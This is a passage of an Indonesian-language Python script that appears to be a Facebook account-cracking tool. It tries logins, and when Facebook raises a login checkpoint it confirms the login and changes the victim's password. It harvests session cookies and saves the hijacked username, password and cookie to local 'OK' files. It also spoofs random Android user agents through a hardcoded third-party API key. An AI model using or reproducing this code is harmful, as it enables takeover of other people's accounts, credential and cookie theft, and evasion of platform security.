		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s ╰─  %s\033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat Detail Login Yang Ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n ╰─  OK %s%s%s|%s|%s			"%(H,til,N,H,idf,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,idf,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s ╰─  \033[0mAkun Terpasang Autentikasi Dua Faktor			"%(M))
			else:
				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s ╰─  %s"%(M,oh))
	else:
		print("%s ╰─  \033[0mLogin Gagal, Silahkan Cek Kembali Id Dan Kata Sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 4.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36")

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/RAF-MKZ')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	loginraf()
